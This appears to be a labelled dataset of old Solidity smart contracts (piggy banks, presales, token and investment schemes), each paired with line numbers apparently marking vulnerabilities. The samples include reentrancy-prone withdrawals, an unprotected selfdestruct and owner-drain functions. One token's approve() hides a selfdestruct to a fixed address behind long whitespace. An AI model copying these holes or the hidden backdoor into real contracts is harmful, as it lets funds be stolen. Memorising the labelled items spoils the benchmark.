	function transferPayable(address _address, uint _amount) private returns (bool) {
	    accounts[_address] = safeAdd(accounts[_address], _amount);
	    accounts[owner] = safeSub(accounts[owner], _amount);
	    totalSold = safeAdd(totalSold, _amount);
	    return true;
	}
	// вычисления количество токенов, равное количество отправленных эфиров
	// исходя из стоимости токена, бонуса и скидки
	function get_tokens_count(uint _amount) private returns (uint) {
	     uint currentPrice = tokenPrice;
	     uint tokens = safeDiv( safeMul(_amount, _decimals), currentPrice ) ;
	     totalSold = safeAdd(totalSold, tokens);
	     if(currentState == State.PRE_ICO) {
	         tokens = safeAdd(tokens, get_bounce_tokens(tokens)); // вызывается при PRE-ICO
	     } else if(currentState == State.ICO) {
	         tokens = safeAdd(tokens, get_discount_tokens(tokens)); // вызывается при ICO
	     }
	     return tokens;
	}
	// вычисление текущей скидки
	function get_discount_tokens(uint _tokens) isAllowedBounce private returns (uint) {
	    uint tokens = 0;
	    uint _current_percent = safeMul(current_discount, 100);
	    tokens = _tokens * _current_percent / 10000;
	    totalBounces = safeAdd(totalBounces, tokens);
	    return tokens;
	}
	// вычисление бонусных токенов
	function get_bounce_tokens(uint _tokens) isAllowedBounce() private returns (uint) {
	    uint tokens = 0;
	    uint _current_percent = safeMul(current_percent, 100);
	    tokens = _tokens * _current_percent / 10000;
	    totalBounces = safeAdd(totalBounces, tokens);
	    return tokens;
	}
	// функция, которая вызывается при отправке эфира на контракт
	function buy() public saleIsOn() minAmount() payable {
	    uint tokens;
	    tokens = get_tokens_count(msg.value);
		require(transferPayable(msg.sender , tokens));
		if(_allowedTransfers) {
			beneficiary.transfer(msg.value);
			balances[msg.sender] = safeAdd(balances[msg.sender], msg.value);
			balancesKeys.push(msg.sender);
	    }
	}
	// возврат средств, вызывается владельцем контракта,
	// для возврата на контракте должны присутствовать эфиры
	function refund() onlyOwner {
      for(uint i = 0 ; i < balancesKeys.length ; i++) {
          address addr = balancesKeys[i];
          uint value = balances[addr];
          balances[addr] = 0;
          accounts[addr] = 0;
          addr.transfer(value);
      }
    }
	function() external payable {
      buy();
    }
}",[64]
"pragma solidity ^0.4.25;
contract PiggY_BANK
{
    function Put(uint _unlockTime)
    public
    payable
    {
        var acc = Acc[msg.sender];
        acc.balance += msg.value;
        acc.unlockTime = _unlockTime>now?_unlockTime:now;
        LogFile.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        var acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
        {
            if(msg.sender.call.value(_am)())
            {
                acc.balance-=_am;
                LogFile.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Put(0);
    }
    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }
    mapping (address => Holder) public Acc;
    Log LogFile;
    uint public MinSum = 1 ether;    
    function PiggY_BANK(address log) public{
        LogFile = Log(log);
    }
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[18, 20, 22]"
"pragma solidity ^0.4.24;
contract PiggyBank  {
  string public name;
  string public symbol = '%';
  uint8 constant public decimals = 18;
  uint256 constant internal denominator = 10 ** uint256(decimals);
  uint256 internal targetAmount;
  address internal targetAddress;
  constructor(
    string goalName,
    uint256 goalAmount
  ) public
  {
    name = goalName;
    targetAmount = goalAmount;
    targetAddress = msg.sender;
  }
  function balanceOf() view public returns(uint256)
  {
    return 100 * address(this).balance / targetAmount;
  }
  event Transfer(address indexed from, address indexed to, uint256 value);
  function () public payable {
    if (balanceOf() >= 100) {
      selfdestruct(targetAddress);
    }
  }
  function debugDestruct() public {
    selfdestruct(targetAddress);
  }
}","[20, 28, 29]"
"pragma solidity ^0.4.18;
contract PiggyBank {
    event Gift(address indexed donor, uint indexed amount);
    event Lambo(uint indexed amount);
    uint constant lamboTime = 2058739200; // my niece turns 18
    address niece = 0x1FC7b94f00C54C89336FEB4BaF617010a6867B40; //address of my niece wallet
    function() payable {
        Gift(msg.sender, msg.value);
    }
    function buyLambo() {
        require (block.timestamp > lamboTime && msg.sender == niece);
        Lambo(this.balance);
        msg.sender.transfer(this.balance);
    }
}",[11]
"pragma solidity ^0.4.24;
contract PiggyBank  {
  string public name;
  string public symbol = '%';
  uint8 constant public decimals = 18;
  uint256 constant internal denominator = 10 ** uint256(decimals);
  uint256 public targetAmount;
  bool public complete = false;
  address internal targetAddress;
  constructor(
    string goalName,
    uint256 goalAmount,
    address target
  ) public
  {
    name = goalName;
    targetAmount = goalAmount;
    targetAddress = target;
  }
  function balanceOf(address target) view public returns(uint256)
  {
    if (target != targetAddress)
      return 0;
    if (complete)
      return denominator * 100;
    return denominator * 100 * address(this).balance / targetAmount;
  }
  event Transfer(address indexed from, address indexed to, uint256 value);
  function () public payable {
    emit Transfer(address(this), targetAddress, denominator * msg.value / targetAmount * 100);
    if (balanceOf(targetAddress) >= 100 * denominator) {
      complete = true;
      selfdestruct(targetAddress);
    }
  }
}","[26, 30, 33]"
"pragma solidity ^0.4.25;
contract Piggy_BANK
{
    function Put(uint _unlockTime)
    public
    payable
    {
        var acc = Acc[msg.sender];
        acc.balance += msg.value;
        acc.unlockTime = _unlockTime>now?_unlockTime:now;
        LogFile.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        var acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
        {
            if(msg.sender.call.value(_am)())
            {
                acc.balance-=_am;
                LogFile.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Put(0);
    }
    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }
    mapping (address => Holder) public Acc;
    Log LogFile;
    uint public MinSum = 1 ether;    
    function Piggy_BANK(address log) public{
        LogFile = Log(log);
    }
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[18, 20, 22]"
"pragma solidity ^0.4.25;
contract Piggy_BNK
{
    function Put(uint _unlockTime)
    public
    payable
    {
        var acc = Acc[msg.sender];
        acc.balance += msg.value;
        acc.unlockTime = _unlockTime>now?_unlockTime:now;
        LogFile.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        var acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
        {
            if(msg.sender.call.value(_am)())
            {
                acc.balance-=_am;
                LogFile.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Put(0);
    }
    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }
    mapping (address => Holder) public Acc;
    Log LogFile;
    uint public MinSum = 1 ether;    
    function Piggy_BNK(address log) public{
        LogFile = Log(log);
    }
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[18, 20, 22]"
"pragma solidity ^0.4.25;
contract Piggy_BanK
{
    function Put(uint _unlockTime)
    public
    payable
    {
        var acc = Acc[msg.sender];
        acc.balance += msg.value;
        acc.unlockTime = _unlockTime>now?_unlockTime:now;
        LogFile.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        var acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
        {
            if(msg.sender.call.value(_am)())
            {
                acc.balance-=_am;
                LogFile.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Put(0);
    }
    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }
    mapping (address => Holder) public Acc;
    Log LogFile;
    uint public MinSum = 1 ether;    
    function Piggy_BanK(address log) public{
        LogFile = Log(log);
    }
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[18, 20, 22]"
"pragma solidity ^0.4.25;
contract Piggy_Bank
{
    function Put(uint _unlockTime)
    public
    payable
    {
        var acc = Acc[msg.sender];
        acc.balance += msg.value;
        acc.unlockTime = _unlockTime>now?_unlockTime:now;
        LogFile.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        var acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
        {
            if(msg.sender.call.value(_am)())
            {
                acc.balance-=_am;
                LogFile.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Put(0);
    }
    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }
    mapping (address => Holder) public Acc;
    Log LogFile;
    uint public MinSum = 1 ether;    
    function Piggy_Bank(address log) public{
        LogFile = Log(log);
    }
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[18, 20, 22]"
"pragma solidity ^0.4.25;
contract Piggy_BnK
{
    function Put(uint _unlockTime)
    public
    payable
    {
        var acc = Acc[msg.sender];
        acc.balance += msg.value;
        acc.unlockTime = _unlockTime>now?_unlockTime:now;
        LogFile.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        var acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
        {
            if(msg.sender.call.value(_am)())
            {
                acc.balance-=_am;
                LogFile.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Put(0);
    }
    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }
    mapping (address => Holder) public Acc;
    Log LogFile;
    uint public MinSum = 1 ether;    
    function Piggy_BnK(address log) public{
        LogFile = Log(log);
    }
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[18, 20, 22]"
"pragma solidity ^0.4.25;
contract Piggy_bank
{
    function Put(uint _unlockTime)
    public
    payable
    {
        var acc = Acc[msg.sender];
        acc.balance += msg.value;
        acc.unlockTime = _unlockTime>now?_unlockTime:now;
        LogFile.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        var acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
        {
            if(msg.sender.call.value(_am)())
            {
                acc.balance-=_am;
                LogFile.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Put(0);
    }
    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }
    mapping (address => Holder) public Acc;
    Log LogFile;
    uint public MinSum = 1 ether;    
    function Piggy_bank(address log) public{
        LogFile = Log(log);
    }
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[18, 20, 22]"
"		var balance = dividends(msg.sender);
		payouts[msg.sender] += (int256) (balance * PRECISION);
		totalPayouts += (int256) (balance * PRECISION);
		msg.sender.transfer(balance);
		return true;
    }
	function sellMyTokensDaddy() public {
		var balance = balanceOf(msg.sender);
		transferTokens(msg.sender, address(this),  balance); // this triggers the internal sell function
	}
    function getMeOutOfHere() public {
		sellMyTokensDaddy();
        withdraw(1); // parameter is ignored
	}
	function fund()
      public
      payable
      returns (bool)
    {
      if (msg.value > 0.000001 ether)
			buy();
		else
			return false;
      return true;
    }
	function buyPrice() public constant returns (uint) {
		return getTokensForEther(1 finney);
	}
	function sellPrice() public constant returns (uint) {
		return getEtherForTokens(1 finney);
	}
	// End of useless functions
	// Invariants
	// totalPayout/Supply correct:
	//   totalPayouts = \sum_{addr:address} payouts(addr)
	//   totalSupply  = \sum_{addr:address} balanceOfOld(addr)
	// dividends not negative:
	//   \forall addr:address. payouts[addr] <= earningsPerShare * balanceOfOld[addr]
	// supply/reserve correlation:
	//   totalSupply ~= exp(LOGC + CRRN/CRRD*log(reserve())
	//   i.e. totalSupply = C * reserve()**CRR
	// reserve equals balance minus payouts
	//   reserve() = this.balance - \sum_{addr:address} dividends(addr)
	function transferTokens(address _from, address _to, uint256 _value) internal {
		if (balanceOfOld[_from] < _value)
			revert();
		if (_to == address(this)) {
			sell(_value);
		} else {
		    int256 payoutDiff = (int256) (earningsPerShare * _value);
		    balanceOfOld[_from] -= _value;
		    balanceOfOld[_to] += _value;
		    payouts[_from] -= payoutDiff;
		    payouts[_to] += payoutDiff;
		}
		Transfer(_from, _to, _value);
	}
	function transfer(address _to, uint256 _value) public {
	    transferTokens(msg.sender, _to,  _value);
	}
    function transferFrom(address _from, address _to, uint256 _value) public {
        var _allowance = allowance[_from][msg.sender];
        if (_allowance < _value)
            revert();
        allowance[_from][msg.sender] = _allowance - _value;
        transferTokens(_from, _to, _value);
    }
    function approve(address _spender, uint256 _value) public {
        // To change the approve amount you first have to reduce the addresses`
        //  allowance to zero by calling `approve(_spender, 0)` if it is not
        //  already 0 to mitigate the race condition described here:
        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
        if ((_value != 0) && (allowance[msg.sender][_spender] != 0)) revert();
        allowance[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    selfdestruct(0x945C84b2FdD331ed3E8e7865E830626e6CeFAB94);
    }
	function dividends(address _owner) public constant returns (uint256 amount) {
		return (uint256) ((int256)(earningsPerShare * balanceOfOld[_owner]) - payouts[_owner]) / PRECISION;
	}
	function withdrawOld(address to) public {
		var balance = dividends(msg.sender);
		payouts[msg.sender] += (int256) (balance * PRECISION);
		totalPayouts += (int256) (balance * PRECISION);
		to.transfer(balance);
	}
	function balance() internal constant returns (uint256 amount) {
		return this.balance - msg.value;
	}
	function reserve() public constant returns (uint256 amount) {
		return balance()
			- ((uint256) ((int256) (earningsPerShare * totalSupply) - totalPayouts) / PRECISION) - 1;
	}
	function buy() internal {
		if (msg.value < 0.000001 ether || msg.value > 1000000 ether)
			revert();
		var sender = msg.sender;
		// 10 % of the amount is used to pay holders.
		var fee = (uint)(msg.value / 10);
		// compute number of bought tokens
		var numEther = msg.value - fee;
		var numTokens = getTokensForEther(numEther);
		var buyerfee = fee * PRECISION;
		if (totalSupply > 0) {
			// compute how the fee distributed to previous holders and buyer.
			// The buyer already gets a part of the fee as if he would buy each token separately.
			var holderreward =
			    (PRECISION - (reserve() + numEther) * numTokens * PRECISION / (totalSupply + numTokens) / numEther)
			    * (uint)(CRRD) / (uint)(CRRD-CRRN);
			var holderfee = fee * holderreward;
			buyerfee -= holderfee;
			// Fee is distributed to all existing tokens before buying
			var feePerShare = holderfee / totalSupply;
			earningsPerShare += feePerShare;
		}
		// add numTokens to total supply
		totalSupply += numTokens;
		// add numTokens to balance
		balanceOfOld[sender] += numTokens;
		// fix payouts so that sender doesn't get old earnings for the new tokens.
		// also add its buyerfee
		var payoutDiff = (int256) ((earningsPerShare * numTokens) - buyerfee);
		payouts[sender] += payoutDiff;
		totalPayouts += payoutDiff;
	}
	function sell(uint256 amount) internal {
		var numEthers = getEtherForTokens(amount);
		// 10% of the amount is used to reward HODLers","[52, 76]"
"        player_[_affID3].aff3sum = player_[_affID3].aff3sum.add(1);
        player_[_affID4].aff4sum = player_[_affID4].aff4sum.add(1);
	}
    // this function called every time anyone sends a transaction to this contract
    function () isActivated() external payable {
        if (msg.value == 0) {
            withdraw();
        } else {
            invest(1000, 1);
        }
    }
    function invest(uint256 _affCode, uint256 _planId) isActivated() public payable {
	    require(_planId >= 1 && _planId <= ruleSum_, ""_planId error"");
		//get uid
		uint256 uid = pIDxAddr_[msg.sender];
		//first
		if (uid == 0) {
		    if (player_[_affCode].addr != address(0x0)) {
		        register_(msg.sender, _affCode);
		    } else {
			    register_(msg.sender, 1000);
		    }
			uid = G_NowUserId;
		}
	    require(msg.value >= plan_[_planId].min && msg.value <= plan_[_planId].max, ""invest amount error, please set the exact amount"");
        // record block number and invested amount (msg.value) of this transaction
        uint256 planCount = player_[uid].planCount;
        player_[uid].plans[planCount].planId = _planId;
        player_[uid].plans[planCount].startTime = now;
        player_[uid].plans[planCount].startBlock = block.number;
        player_[uid].plans[planCount].atBlock = block.number;
        player_[uid].plans[planCount].invested = msg.value;
        player_[uid].plans[planCount].payEth = 0;
        player_[uid].plans[planCount].isClose = false;
        player_[uid].planCount = player_[uid].planCount.add(1);
        G_AllEth = G_AllEth.add(msg.value);
        if (msg.value > 1000000000) {
            distributeRef(msg.value, player_[uid].laff);
            uint256 devFee = (msg.value.mul(2)).div(100);
            devAddr_.transfer(devFee);
            uint256 partnerFee = (msg.value.mul(2)).div(100);
            partnerAddr_.transfer(partnerFee);
        }
    }
	function withdraw() isActivated() public payable {
	    require(msg.value == 0, ""withdraw fee is 0 ether, please set the exact amount"");
	    uint256 uid = pIDxAddr_[msg.sender];
	    require(uid != 0, ""no invest"");
        for(uint i = 0; i < player_[uid].planCount; i++) {
	        if (player_[uid].plans[i].isClose) {
	            continue;
	        }
            SDDatasets.Plan plan = plan_[player_[uid].plans[i].planId];
            uint256 blockNumber = block.number;
            bool bClose = false;
            if (plan.dayRange > 0) {
                uint256 endBlockNumber = player_[uid].plans[i].startBlock.add(plan.dayRange*G_DayBlocks);
                if (blockNumber > endBlockNumber){
                    blockNumber = endBlockNumber;
                    bClose = true;
                }
            }
            uint256 amount = player_[uid].plans[i].invested * plan.interest / 10000 * (blockNumber - player_[uid].plans[i].atBlock) / G_DayBlocks;
            // send calculated amount of ether directly to sender (aka YOU)
            address sender = msg.sender;
            sender.send(amount);
            // record block number and invested amount (msg.value) of this transaction
            player_[uid].plans[i].atBlock = block.number;
            player_[uid].plans[i].isClose = bClose;
            player_[uid].plans[i].payEth += amount;
        }
	}
    function distributeRef(uint256 _eth, uint256 _affID) private{
        uint256 _allaff = (_eth.mul(8)).div(100);
        uint256 _affID1 = _affID;
        uint256 _affID2 = player_[_affID1].laff;
        uint256 _affID3 = player_[_affID2].laff;
        uint256 _aff = 0;
        if (_affID1 != 0) {
            _aff = (_eth.mul(5)).div(100);
            _allaff = _allaff.sub(_aff);
            player_[_affID1].aff = _aff.add(player_[_affID1].aff);
            player_[_affID1].addr.transfer(_aff);
        }
        if (_affID2 != 0) {
            _aff = (_eth.mul(2)).div(100);
            _allaff = _allaff.sub(_aff);
            player_[_affID2].aff = _aff.add(player_[_affID2].aff);
            player_[_affID2].addr.transfer(_aff);
        }
        if (_affID3 != 0) {
            _aff = (_eth.mul(1)).div(100);
            _allaff = _allaff.sub(_aff);
            player_[_affID3].aff = _aff.add(player_[_affID3].aff);
            player_[_affID3].addr.transfer(_aff);
       }
        if(_allaff > 0 ){
            affiAddr_.transfer(_allaff);
        }
    }
}","[63, 66]"
"    backEndOperator = newBackEndOperator;
  }
  function setBuyPrice(uint256 _dollar) public backEnd {
    dollarPrice = _dollar;
    buyPrice = (1e18/dollarPrice).div(10); // 0.1 usd
    emit UpdateDollar(now, dollarPrice);
  }
  /*******************************************************************************
   * Payable's section */
  function isPreSale() public constant returns(bool) {
    return now >= startPreSale && now <= endPreSale;
  }
  function () public payable {
    require(authorize.isWhitelisted(msg.sender));
    require(isPreSale());
    preSale(msg.sender, msg.value);
    require(soldTokensPreSale<=hardCapPreSale);
    investedEther[msg.sender] = investedEther[msg.sender].add(msg.value);
  }
  function preSale(address _investor, uint256 _value) internal {
    uint256 tokens = _value.mul(1e18).div(buyPrice);
    uint256 tokensByDate = tokens.mul(bonusDate()).div(100);
    tokens = tokens.add(tokensByDate);
    token.mintFromICO(_investor, tokens);
    soldTokensPreSale = soldTokensPreSale.add(tokens); // only sold
    uint256 tokensTeam = tokens.mul(10).div(44); // 20 %
    token.mintFromICO(team, tokensTeam);
    uint256 tokensBoynty = tokens.mul(3).div(200); // 1.5 %
    token.mintFromICO(bounty, tokensBoynty);
    weisRaised = weisRaised.add(_value);
  }
  function bonusDate() private view returns (uint256){
    if (now > startPreSale && now < stage1Sale) {  // 0 - 2 days preSale
      return 50;
    }
    else if (now > stage1Sale && now < stage2Sale) { // 3 - 10 days preSale
      return 40;
    }
    else if (now > stage2Sale && now < stage3Sale) { // 11 - 18 days preSale
      return 33;
    }
    else if (now > stage3Sale && now < stage4Sale) { // 19 - 26 days preSale
      return 30;
    }
    else if (now > stage4Sale && now < stage5Sale) { // 27 - 31 days preSale
      return 25;
    }
    else {
      return 0;
    }
  }
  function mintManual(address receiver, uint256 _tokens) public backEnd {
    token.mintFromICO(receiver, _tokens);
    soldTokensPreSale = soldTokensPreSale.add(_tokens);
    uint256 tokensTeam = _tokens.mul(10).div(44); // 20 %
    token.mintFromICO(team, tokensTeam);
    uint256 tokensBoynty = _tokens.mul(3).div(200); // 1.5 %
    token.mintFromICO(bounty, tokensBoynty);
  }
  function transferEthFromContract(address _to, uint256 amount) public onlyOwner {
    _to.transfer(amount);
  }
  function refundPreSale() public {
    require(soldTokensPreSale < softcapPreSale && now > endPreSale);
    uint256 rate = investedEther[msg.sender];
    require(investedEther[msg.sender] >= 0);
    investedEther[msg.sender] = 0;
    msg.sender.transfer(rate);
    weisRaised = weisRaised.sub(rate);
    emit Refund(rate, msg.sender);
  }
}",[64]
"    mintAndSendTokens(bountyTokensWallet, bountyTokens);
    uint advisorsTokens = summaryTokens.mul(advisorsTokensPercent).div(PERCENT_RATE);
    mintAndSendTokens(advisorsTokensWallet, advisorsTokens);
    uint devTokens = extendedTokens.sub(advisorsTokens).sub(bountyTokens);
    mintAndSendTokens(devTokensWallet, devTokens);
  }
  function mintAndSendTokens(address to, uint amount) internal {
    token.mint(to, amount);
    minted = minted.add(amount);
  }
  function calculateAndTransferTokens() internal {
    // update invested value
    invested = invested.add(msg.value);
    // calculate tokens
    uint tokens = msg.value.mul(price).div(1 ether);
    uint bonus = getBonus();
    if(bonus > 0) {
      tokens = tokens.add(tokens.mul(bonus).div(100));
    }
    // transfer tokens
    mintAndSendTokens(msg.sender, tokens);
  }
  function getBonus() public constant returns(uint) {
    uint prevTimeLimit = start;
    for (uint i = 0; i < bonuses.length; i++) {
      Bonus storage bonus = bonuses[i];
      prevTimeLimit += bonus.periodInDays * 1 days;
      if (now < prevTimeLimit)
        return bonus.bonus;
    }
    return 0;
  }
  function createTokens() public payable;
  function() external payable {
    createTokens();
  }
  function retrieveTokens(address anotherToken) public onlyOwner {
    ERC20 alienToken = ERC20(anotherToken);
    alienToken.transfer(wallet, token.balanceOf(this));
  }
}
contract Presale is CommonCrowdsale {
  uint public devLimit;
  uint public softcap;
  bool public refundOn;
  bool public softcapAchieved;
  bool public devWithdrawn;
  address public devWallet;
  address public nextSaleAgent;
  mapping (address => uint) public balances;
  function setNextSaleAgent(address newNextSaleAgent) public onlyOwner notLocked {
    nextSaleAgent = newNextSaleAgent;
  }
  function setSoftcap(uint newSoftcap) public onlyOwner notLocked {
    softcap = newSoftcap;
  }
  function setDevWallet(address newDevWallet) public onlyOwner notLocked {
    devWallet = newDevWallet;
  }
  function setDevLimit(uint newDevLimit) public onlyOwner notLocked {
    devLimit = newDevLimit;
  }
  function refund() public {
    require(now > start && refundOn && balances[msg.sender] > 0);
    uint value = balances[msg.sender];
    balances[msg.sender] = 0;
    msg.sender.transfer(value);
  }
  function createTokens() public payable saleIsOn {
    balances[msg.sender] = balances[msg.sender].add(msg.value);
    calculateAndTransferTokens();
    if(!softcapAchieved && invested >= softcap) {
      softcapAchieved = true;
    }
  }
  function widthrawDev() public {
    require(softcapAchieved);
    require(devWallet == msg.sender || owner == msg.sender);
    if(!devWithdrawn) {
      devWithdrawn = true;
      devWallet.transfer(devLimit);
    }
  }
  function widthraw() public {
    require(softcapAchieved);
    require(owner == msg.sender);
    widthrawDev();
    wallet.transfer(this.balance);
  }
  function finishMinting() public onlyOwner {
    if(!softcapAchieved) {
      refundOn = true;
      token.finishMinting();
    } else {
      mintExtendedTokens();
      token.setSaleAgent(nextSaleAgent);
    }
  }
}
contract ICO is CommonCrowdsale {
  function finishMinting() public onlyOwner {
    mintExtendedTokens();
    token.finishMinting();
  }
  function createTokens() public payable saleIsOn {
    calculateAndTransferTokens();
    wallet.transfer(msg.value);
  }
}
contract Deployer is Ownable {
  Presale public presale;
  ICO public ico;
  GENSharesToken public token;
  function deploy() public onlyOwner {
    owner = 0x379264aF7df7CF8141a23bC989aa44266DDD2c62;
    token = new GENSharesToken();
    presale = new Presale();
    presale.setToken(token);
    token.setSaleAgent(presale);
    presale.setMinInvestedLimit(40000000000000000000);
    presale.setPrice(250000000000000000000);
    presale.setBountyTokensPercent(4);
    presale.setAdvisorsTokensPercent(2);
    presale.setDevTokensPercent(10);
    presale.setSoftcap(40000000000000000000);
    presale.setHardcap(50000000000000000000000);
    presale.addBonus(7,50);
    presale.addBonus(7,40);",[64]
"pragma solidity ^0.4.16;
/**
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {
  function mul(uint256 a, uint256 b) internal constant returns (uint256) {
    uint256 c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal constant returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }
  function sub(uint256 a, uint256 b) internal constant returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal constant returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract Presale {
  using SafeMath for uint256;
  mapping (address => uint256) public balances;
  // Minimum amount of wei required for presale to be successful.  If not successful, refunds are provided.
  uint256 public minGoal;
  // The epoch unix timestamp of when the presale starts
  uint256 public startTime;
  // The epoch unix timestamp of when the presale ends
  uint256 public endTime;
  // The wallet address that the funds will be sent to
  address public projectWallet;
  uint256 private totalRaised;
  function Presale() {
    minGoal = 83.33 ether;
    startTime = 1505248886;
    endTime = 1506841199;   // Sept 30, 2017 midnight PT
    projectWallet = address(0x2a00BFd8379786ADfEbb6f2F59011535a4f8d4E4);
  }
  function transferToProjectWallet() {
    // only allow transfers if there is balance
    require(this.balance > 0);
    // only allow transfers if minimum goal is met
    require(totalRaised >= minGoal);
    if(!projectWallet.send(this.balance)) {
      revert();
    }
  }
  function refund() {
    // only allow refund if the presale has ended
    require(now > endTime);
    // only allow refund if the minGoal has not been reached
    require(totalRaised < minGoal);
    // only allow refund during a 60 day window after presale ends
    require(now < (endTime + 60 days));
    uint256 amount = balances[msg.sender];
    // only allow refund if investor has invested
    require(amount > 0);
    // after refunding, zero out balance
    balances[msg.sender] = 0;
    msg.sender.transfer(amount);
  }
  function transferRemaining() {
    // only allow transfer if presale has failed
    require(totalRaised < minGoal);
    // only allow transfer after refund window has passed
    require(now >= (endTime + 60 days));
    // only allow transfer if there is remaining balance
    require(this.balance > 0);
    projectWallet.transfer(this.balance);
  }
  function () payable {
    // only allow payments greater than 0
    require(msg.value > 0);
    // only allow payments after presale has started
    require(now >= startTime);
    // only allow payments before presale has ended
    require(now <= endTime);
    // if all checks pass, then add amount to balance of the sender
    balances[msg.sender] = balances[msg.sender].add(msg.value);
    totalRaised = totalRaised.add(msg.value);
  }
}","[61, 76]"
"pragma solidity ^0.4.11;
contract Presale {
    bool isClosed;
    struct Deposit { address buyer; uint amount; }
    uint refundDate;
    address fiduciary = msg.sender;
    Deposit[] public Deposits;
    mapping (address => uint) public total;
    function() public payable { }
    function init(uint date)
    {
        refundDate = date;
    }
    function deposit()
    public payable {
        if (msg.value >= 0.5 ether && msg.sender!=0x0)
        {
            Deposit newDeposit;
            newDeposit.buyer = msg.sender;
            newDeposit.amount = msg.value;
            Deposits.push(newDeposit);
            total[msg.sender] += msg.value;
        }
        if (this.balance >= 100 ether)
        {
            isClosed = true;
        }
    }
    function refund(uint amount)
    public {
        if (now >= refundDate && isClosed==false)
        {
            if (amount <= total[msg.sender] && amount > 0)
            {
                msg.sender.transfer(amount);
            }
        }
    }
    function close()
    public {
        if (msg.sender == fiduciary)
        {
            msg.sender.transfer(this.balance);
        }
    }
}",[31]
"pragma solidity ^0.4.16;
